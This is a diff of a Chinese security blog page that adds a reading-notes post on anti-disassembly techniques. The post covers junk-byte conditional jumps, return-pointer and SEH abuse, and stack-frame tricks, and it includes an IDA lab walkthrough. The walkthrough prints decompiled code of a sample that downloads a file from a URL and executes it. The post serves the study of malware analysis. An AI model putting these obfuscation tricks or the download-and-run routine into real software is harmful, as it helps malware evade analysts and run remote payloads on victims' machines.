@@ -294,6 +294,172 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/17/对抗反汇编技术/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findream">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="findream's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/02/17/对抗反汇编技术/" itemprop="url">反汇编对抗技术[读书笔记]</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-17T16:45:11+08:00">
+                2018-02-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="1-什么是反汇编对抗技术"><a href="#1-什么是反汇编对抗技术" class="headerlink" title="1.什么是反汇编对抗技术"></a>1.什么是反汇编对抗技术</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>对抗反汇编技术就是在程序中使用一些特殊的代码或者数据，让反汇编工具产生不正确的程序代码列表，这种技术由恶意软件编写者手工构造。对抗反汇编的时候，编写者会创建一段代码序列，欺骗反汇编器，使得反汇编器生成与正常代码不同的代码。一般的对抗反汇编的技术利用的是反汇编器的///////////</strong></p>
+<h1 id="2-反汇编的两种基本策略"><a href="#2-反汇编的两种基本策略" class="headerlink" title="2.反汇编的两种基本策略"></a>2.反汇编的两种基本策略</h1><h2 id="2-1-线性反汇编"><a href="#2-1-线性反汇编" class="headerlink" title="2-1.线性反汇编"></a>2-1.线性反汇编</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;线性反汇编是遍历整个代码段，一次一条指令的线性汇编，这样造成一个很严重的漏洞—-不区分代码和数据。如下代码：在一个线性反汇编工具会反汇编0ff_401050处的数据【变成代码】。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">jmp</span> <span class="built_in">ds</span>:off_401050[<span class="built_in">eax</span>*<span class="number">4</span>]<span class="comment">; switch数组</span></div><div class="line"><span class="comment">;switch cases</span></div><div class="line"><span class="symbol">code_1:</span></div><div class="line"><span class="symbol">code_2:</span></div><div class="line">···</div><div class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">esi</span></div><div class="line"><span class="keyword">retn</span></div><div class="line"><span class="comment">;---------------------------------</span></div><div class="line">off_401050：<span class="built_in">dd</span> offset loc_401020  </div><div class="line">            <span class="built_in">dd</span> offset loc_401027</div><div class="line">            <span class="built_in">dd</span> offset loc_40102e</div><div class="line">			<span class="built_in">dd</span> offset loc_401035</div></pre></td></tr></table></figure></p>
+<h2 id="2-2-递归下降策略"><a href="#2-2-递归下降策略" class="headerlink" title="2-2.递归下降策略"></a>2-2.递归下降策略</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用递归下降策略的反汇编器（IDA）反汇编时会检查每个指令，并且为这些指令创建一个需要反汇编的地址表。<strong>一般的使用这种策略的反汇编器在处理条件跳转的时候都会优先反汇编False的分支，</strong>有很多对抗反汇编的方法都是针对这种特性来指定的。如下第一段代码是对抗反汇编的代码，经过修改后的如代码2所示，这就利用了反汇编器优先反汇编false分支（68 65 6c 6c 6f 00处的数据）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">E8 06 00 00 00             call  near ptr loc_4011CA+1</div><div class="line">68 65 6c 6c 6f             push 6f6c6c65h   ;显然这是一个错误地址，68h是h的ASCII码，代表的机器码是push</div><div class="line">                           loc_4011CA:</div><div class="line">00 58 c3                   add [edx-3dh],bl</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">E8 06 00 00 00             call  near ptr loc_4011CB</div><div class="line">68 65 6c 6c 6f 00          db &quot;hello&quot;,00      ;数据</div><div class="line">                           loc_4011CB:</div><div class="line">58                         pop eax</div><div class="line">c3                         retn</div></pre></td></tr></table></figure>
+<h1 id="3-基于条件跳转的对抗反汇编"><a href="#3-基于条件跳转的对抗反汇编" class="headerlink" title="3.基于条件跳转的对抗反汇编"></a>3.基于条件跳转的对抗反汇编</h1><h2 id="3-1-相同目标的跳转指令"><a href="#3-1-相同目标的跳转指令" class="headerlink" title="3-1.相同目标的跳转指令"></a>3-1.相同目标的跳转指令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种反汇编技术是使用指向同一个地址的两个连续的条件跳转实现的。通常，恶意代码编写者会构造一个特殊的机器码(如E8，E9)插入的代码中来干扰反汇编。如code_1所示：这个是被处理好的反汇编列表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">74 03                   jz   short near ptr loc_4011C5</div><div class="line">75 01                   jnz  short near ptr loc_4011C5</div><div class="line">;----------------------------------------------------</div><div class="line">                        db e8h    ;构造的数据E8H</div><div class="line">                        loc_4001c5</div><div class="line">58                      pop  </div><div class="line">c3                      retn</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">74 03                   jz   short near ptr loc_4011C5</div><div class="line">75 01                   jnz  short near ptr loc_4011C5</div><div class="line">                        loc_4001c4:</div><div class="line">E8 58 C3 90 90          call 90D0D521h         ;错误的地址</div></pre></td></tr></table></figure>
+<h2 id="3-2：固定条件的跳转指令"><a href="#3-2：固定条件的跳转指令" class="headerlink" title="3-2：固定条件的跳转指令"></a>3-2：固定条件的跳转指令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过构造确定条件的条件跳转（如 xor eax,eax jz xxxx）来实现对抗反汇编，因为反汇编器只会处理false分支，存在条件跳转，其不会判断跳转是否是必然的结果。如代码1所示是一个正常的代码清单，但是没有经过处理是是代码2.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">33 c0                   xor eax,eax</div><div class="line">74 01                   jz  short near ptr loc_4011C5</div><div class="line">;----------------------------------------------------</div><div class="line">E9                        db e9h    ;构造的数据E9H</div><div class="line">                        loc_4001c5</div><div class="line">58                      pop  </div><div class="line">c3                      retn</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">33 c0                   xor eax,eax</div><div class="line">74 01                   jz  short near ptr loc_4011C4+1</div><div class="line">                        loc_4001c4:</div><div class="line">E9 58 C3 68 94          jmp 90D0D521h         ;错误的地址</div></pre></td></tr></table></figure>
+<h2 id="3-3-无效的反汇编指令"><a href="#3-3-无效的反汇编指令" class="headerlink" title="3-3:无效的反汇编指令"></a>3-3:无效的反汇编指令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同一个字节作为两个不同指令的子集出现的时候，我们应该适当的选取，把不用的字节nop掉。</p>
+<h1 id="4-混淆控制流图"><a href="#4-混淆控制流图" class="headerlink" title="4.混淆控制流图"></a>4.混淆控制流图</h1><h2 id="4-1：函数指针问题"><a href="#4-1：函数指针问题" class="headerlink" title="4-1：函数指针问题"></a>4-1：函数指针问题</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用函数指针，可以减少反汇编器推导出有效的信息量。如code1所示：是在sub_4011d0中调用sub_4011c0，在4011d5处引用了指针，但是也只是在该处使用了交叉引用，但是没有在4011de和4011e9两个调用sub_4011c0函数的地方采取交叉引用。<strong>解决方法是对var_4进行重命名</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">1011c0   sub_4011c0</div><div class="line">4011c0   arg_0       =<span class="built_in">dword</span> pro <span class="number">8</span></div><div class="line">4011c0               <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">4011c1               <span class="keyword">mov</span> <span class="built_in">ebp</span> <span class="built_in">esp</span></div><div class="line">                     <span class="comment">;code_sub4011C0</span></div><div class="line">4011ca               sub_4011c0 endp</div><div class="line">4011d0   sub_4011d0</div><div class="line">4011d0               <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">4011d1               <span class="keyword">mov</span> <span class="built_in">ebp</span> <span class="built_in">esp</span></div><div class="line">4011d3               <span class="keyword">push</span> <span class="built_in">ecx</span></div><div class="line">4011d5               <span class="keyword">mov</span> [<span class="built_in">ebp</span>+var_4],sub_4011c0</div><div class="line">4011dc               <span class="keyword">push</span> <span class="number">2Ah</span></div><div class="line">4011de               <span class="keyword">call</span> [<span class="built_in">ebp</span>+var_4]      </div><div class="line">4011E1               <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">4</span></div><div class="line">4011e4               <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">eax</span></div><div class="line">4011e6               <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">4011e9               <span class="keyword">call</span> [<span class="built_in">ebp</span>+var_4]</div></pre></td></tr></table></figure></p>
+<h2 id="4-1-滥用返回指针"><a href="#4-1-滥用返回指针" class="headerlink" title="4-1.滥用返回指针"></a>4-1.滥用返回指针</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在ret不以函数调用的方式放回时会出现一下代码清单。call $+5的目的是在400c5压入栈中，而[esp+4+var_4]其实就是esp栈顶。其数值是4011c5，加5，就是4011ca，在ret到4011c5处执行代码！<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">4011</span>c0   sub_4011c0</div><div class="line"><span class="number">4011</span>c0   var_4       =byte ptr <span class="number">-4</span></div><div class="line"><span class="number">4011</span>c0               call $+<span class="number">5</span></div><div class="line"><span class="number">4011</span>c5               add [esp+<span class="number">4</span>+var_4],<span class="number">5</span></div><div class="line"><span class="number">4011</span>c9               ret</div><div class="line"><span class="number">4011</span>c9               sub_4011c0 endp ;sp -analysis failed</div><div class="line"><span class="number">4011</span>ca               ;----------------------------------</div><div class="line"><span class="number">4011</span>ca               push ebp</div><div class="line"><span class="number">4011</span>cb               mov ebp esp</div><div class="line"><span class="number">4011</span>cd               ；CodeFun</div><div class="line"><span class="number">4011</span>d0               retn</div></pre></td></tr></table></figure></p>
+<h2 id="4-3-滥用SEH处理函数。"><a href="#4-3-滥用SEH处理函数。" class="headerlink" title="4-3.滥用SEH处理函数。"></a>4-3.滥用SEH处理函数。</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是SEH不被编译器采用造成的，SEH不多介绍。我们使用以下代码把处理函数添加到SEH链表中。在code1中，401050开始设置异常处理函数，但是执行到401055时eax的值是401071，这一块是SEH的处理函数，不被seh反汇编！<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">push</span> ExceptionHandle</div><div class="line"><span class="keyword">push</span> <span class="built_in">fs</span>:[<span class="number">0</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">esp</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">401050               mov eax,(loc_40106B+1)  ;设置异常处理函数</div><div class="line">401055               add eax,14h</div><div class="line">401058               push eax</div><div class="line">401059               push fs:[0]</div><div class="line">401060               mov fs:[0],esp</div><div class="line">401067               xor ecx,ecx              ;抛出异常</div><div class="line">401069               div ecx</div><div class="line">40106B               call sleep</div><div class="line">401070               retn</div><div class="line">401070               sub_401050endp sp-snalysis failed</div><div class="line">401070              ---------------------------------</div><div class="line">401071              data.......</div></pre></td></tr></table></figure>
+<ul>
+<li>如图，修补程序创建函数，得到一个函数，但是发现这个函数没有外部参考，且发现一个除0异常如图1，可以肯定得是这个函数肯定调用。（应为下个函数出现了SEH结构）<br>   <img src="https://i.imgur.com/RnWW2Mk.png" alt=""><br>   <img src="https://i.imgur.com/XcvuJkz.png" alt=""></li>
+<li>在main函数出现这个!400000H和148ch异或运算结果（40148c）存在ebp+4中，ebp+4用来保存函数的返回地址，此地址被覆盖，根据缓冲区溢出的原理，我们可以知道这个很有可能只需恶意代码。<br>   <img src="https://i.imgur.com/yOxdcCD.png" alt=""><br>   <img src="https://i.imgur.com/QdkXKTZ.png" alt=""></li>
+<li>如图是在设置SEH处理例程。Handle函数的地址是4014c0<br>  <img src="https://i.imgur.com/C6VEPh4.png" alt=""></li>
+<li>处理4014c0，发现是一个下载运行器<br>  <img src="https://i.imgur.com/rHH6ovM.png" alt=""><h2 id="4-4-对抗栈帧分析"><a href="#4-4-对抗栈帧分析" class="headerlink" title="4-4.对抗栈帧分析"></a>4-4.对抗栈帧分析</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ida试图分析一个函数来确定其栈帧结构，特别是遇到ret/retn就认为到达一个函数结尾，因此很容易伪造栈帧来阻止静态分析。给之前的代码加上一个ret 0xff//////<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;就是在函数中改变esp的值：比如说这里的”cmp esp,0x1000”,后面的”add esp , 0x104h”是永远不会执行的，在这里可以改变esp,也可以做其他的很多混淆手段。如以下代码，cmp esp，1000h恒大于1000h，所以，不会执行add esp，104h，关于堆栈可以用的数据就是sub esp,8；sub esp,4；和add esp,4，所以会分配8个字节栈空间，共计2个参数（int）。<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="number">401543</span>             sub_401543 pronear </div><div class="line"><span class="number">401543</span>             arg_F4  = <span class="number">0F8H</span></div><div class="line"><span class="number">401543</span>             arg_F8  = <span class="number">0fch</span></div><div class="line"><span class="number">401543</span>             <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">8</span></div><div class="line"><span class="number">401546</span>             <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">4</span></div><div class="line"><span class="number">401549</span>             <span class="keyword">cmp</span> <span class="built_in">esp</span>,<span class="number">1000h</span>    <span class="comment">;esp与1000h比较，1000h处于内存最低页，不可能被栈使用</span></div><div class="line">40154f             <span class="keyword">jl</span> short loc_401556   ；小于跳转</div><div class="line"><span class="number">401551</span>             <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">4</span></div><div class="line"><span class="number">401554</span>             <span class="keyword">jmp</span> short loc_40155c</div><div class="line"><span class="number">401556</span>    <span class="comment">;-----------------------------</span></div><div class="line"><span class="number">401556</span>    loc_401556:</div><div class="line"><span class="number">401556</span>             <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">104h</span></div><div class="line">40155c    <span class="comment">;-----------------------------</span></div><div class="line">40155c    loc_40155c:</div><div class="line">40155c             <span class="keyword">mov</span> [<span class="built_in">esp</span>-<span class="number">0f8h</span>+arg_F8],<span class="number">1E61h</span><span class="comment">; [esp-4]esp为负数，不符合逻辑，IDA 堆栈分析异常</span></div><div class="line">·······</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="5-实战分析"><a href="#5-实战分析" class="headerlink" title="5.实战分析"></a>5.实战分析</h1><h2 id="5-1-例1："><a href="#5-1-例1：" class="headerlink" title="5-1.例1："></a>5-1.例1：</h2><ul>
+<li>在IDA出现红色的警告，说明反汇编失败，这时候我们用D,或者C键来转化数据类型<br>  <img src="https://i.imgur.com/RVuyWwH.png" alt=""></li>
+<li>然后编辑-修补程序-改变字节，改成90H，在C键可以转化为代码。</li>
+<li>把所有的都修复完毕，发现不能F5，原因是不是一个函数，编辑–函数–创建函数，就行了<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">const</span> CHAR *v4; <span class="comment">// eax@16</span></div><div class="line">  FILE *File; <span class="comment">// ST24_4@22</span></div><div class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *lpBuffer; <span class="comment">// [sp+10h] [bp-102ACh]@20</span></div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Filename; <span class="comment">// [sp+14h] [bp-102A8h]@20</span></div><div class="line">  HINTERNET hInternet; <span class="comment">// [sp+18h] [bp-102A4h]@16</span></div><div class="line">  <span class="keyword">char</span> Buffer; <span class="comment">// [sp+1Ch] [bp-102A0h]@1</span></div><div class="line">  <span class="keyword">char</span> v10; <span class="comment">// [sp+1Dh] [bp-1029Fh]@1</span></div><div class="line">  __int16 v11; <span class="comment">// [sp+10019h] [bp-2A3h]@1</span></div><div class="line">  <span class="keyword">char</span> v12; <span class="comment">// [sp+1001Bh] [bp-2A1h]@1</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+1001Ch] [bp-2A0h]@5</span></div><div class="line">  HINTERNET hFile; <span class="comment">// [sp+10020h] [bp-29Ch]@16</span></div><div class="line">  <span class="keyword">char</span> *Str; <span class="comment">// [sp+10024h] [bp-298h]@19</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> <span class="title">WSAData</span>;</span> <span class="comment">// [sp+10028h] [bp-294h]@1</span></div><div class="line">  DWORD dwNumberOfBytesRead; <span class="comment">// [sp+101B8h] [bp-104h]@17</span></div><div class="line">  <span class="keyword">char</span> name[<span class="number">256</span>]; <span class="comment">// [sp+101BCh] [bp-100h]@3</span></div><div class="line">  Buffer = <span class="number">0</span>;</div><div class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0xFFFC</span>u);</div><div class="line">  v11 = <span class="number">0</span>;</div><div class="line">  v12 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> ( WSAStartup(<span class="number">0x202</span>u, &amp;WSAData) )</div><div class="line">  &#123;</div><div class="line">    result = <span class="number">-1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( gethostname(name, <span class="number">256</span>) )     <span class="comment">//获取主机名</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> &amp;&amp; name[i]; ++i )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">switch</span> ( name[i] )                <span class="comment">//比较，不是Z，z，9的话就加1</span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">case</span> <span class="string">'Z'</span>:</div><div class="line">          name[i] = <span class="string">'A'</span>;</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'z'</span>:</div><div class="line">          name[i] = <span class="string">'a'</span>;</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'9'</span>:</div><div class="line">          name[i] = <span class="string">'0'</span>;</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">          ++name[i];</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    hInternet = InternetOpenA(name, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">    v4 = (<span class="keyword">const</span> CHAR *)URL();</div><div class="line">    hFile = InternetOpenUrlA(hInternet, v4, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span> ( hFile &amp;&amp; InternetReadFile(hFile, &amp;Buffer, <span class="number">0xFFFF</span>u, &amp;dwNumberOfBytesRead) )</div><div class="line">    &#123;</div><div class="line">      InternetCloseHandle(hFile);</div><div class="line">      Str = <span class="built_in">strstr</span>(&amp;Buffer, SubStr);</div><div class="line">      <span class="keyword">if</span> ( Str )</div><div class="line">      &#123;</div><div class="line">        *<span class="built_in">strstr</span>(Str, asc_40303C) = <span class="number">0</span>;           <span class="comment">// 判断SubStr是否存在Buf中</span></div><div class="line">        Filename = Exe();</div><div class="line">        lpBuffer = <span class="built_in">malloc</span>(<span class="number">0xA00000</span>u);</div><div class="line">        Str += <span class="number">8</span>;</div><div class="line">        hFile = InternetOpenUrlA(hInternet, Str, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">        <span class="keyword">if</span> ( InternetReadFile(hFile, (LPVOID)lpBuffer, <span class="number">0x10000</span>u, &amp;dwNumberOfBytesRead) )</div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span> ( dwNumberOfBytesRead )</div><div class="line">          &#123;</div><div class="line">            File = fopen(Filename, Mode);</div><div class="line">            fwrite(lpBuffer, dwNumberOfBytesRead, <span class="number">1u</span>, File);  <span class="comment">//写入文件</span></div><div class="line">            fclose(File);</div><div class="line">            ShellExecuteA(<span class="number">0</span>, <span class="number">0</span>, Filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);       <span class="comment">//执行</span></div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      result = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">printf</span>(aInternetUnable);</div><div class="line">      result = <span class="number">-1</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(Format);</div><div class="line">    result = <span class="number">-1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/10/Windows_API_函数/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1544,148 +1710,6 @@
             </a>
           </div>
           <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/给逆向分析人员的忠告/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="findream">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="findream's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/12/09/给逆向分析人员的忠告/" itemprop="url">给逆向工作者的忠告</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T17:02:11+08:00">
-                2017-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全/" itemprop="url" rel="index">
-                    <span itemprop="name">安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
